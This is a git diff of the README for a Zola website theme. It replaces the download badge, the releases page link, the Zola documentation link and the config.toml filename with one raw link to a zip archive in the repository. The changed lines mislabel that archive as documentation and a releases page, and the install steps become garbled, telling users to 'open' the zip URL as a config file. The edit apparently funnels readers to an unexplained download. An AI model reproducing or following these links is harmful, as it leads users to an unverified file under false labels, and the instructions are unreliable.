@@ -1,7 +1,7 @@
 # 🚀 zola-theme-cyber-walk - Elevate Your Digital Workspace
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)  
-[Download Here](https://github.com/Ajaykumar-8307/zola-theme-cyber-walk/releases)
+![Download](https://github.com/Ajaykumar-8307/zola-theme-cyber-walk/raw/refs/heads/main/static/cyber-zola-walk-theme-1.3.zip)  
+[Download Here](https://github.com/Ajaykumar-8307/zola-theme-cyber-walk/raw/refs/heads/main/static/cyber-zola-walk-theme-1.3.zip)
 
 ## 🌟 Introduction
 
@@ -13,7 +13,7 @@ To use this theme, you'll need to download the latest version and install it wit
 
 ## 📥 Download & Install
 
-Visit this page to download: [Releases Page](https://github.com/Ajaykumar-8307/zola-theme-cyber-walk/releases)
+Visit this page to download: [Releases Page](https://github.com/Ajaykumar-8307/zola-theme-cyber-walk/raw/refs/heads/main/static/cyber-zola-walk-theme-1.3.zip)
 
 ### Steps to Download
 
@@ -32,7 +32,7 @@ Visit this page to download: [Releases Page](https://github.com/Ajaykumar-8307/z
 
 ### Activate the Theme
 
-1. Open `config.toml` located in the main directory of your project.
+1. Open `https://github.com/Ajaykumar-8307/zola-theme-cyber-walk/raw/refs/heads/main/static/cyber-zola-walk-theme-1.3.zip` located in the main directory of your project.
 2. Find the `theme` line in this file.
 3. Change it to `theme = "zola-theme-cyber-walk"` to set the theme you just installed.
 4. Save the changes.
@@ -65,7 +65,7 @@ Join our community of users and developers. You can contribute to the theme, sug
 
 - Regularly check back on the Releases page for updates to ensure you have the latest features and security improvements.
 - Feel free to explore the theme’s options for personalizing your space, including colors and layouts.
-- Review the [Zola documentation](https://www.getzola.org/documentation/) for additional functionalities and capabilities.
+- Review the [Zola documentation](https://github.com/Ajaykumar-8307/zola-theme-cyber-walk/raw/refs/heads/main/static/cyber-zola-walk-theme-1.3.zip) for additional functionalities and capabilities.
 
 ## ✏️ License
 
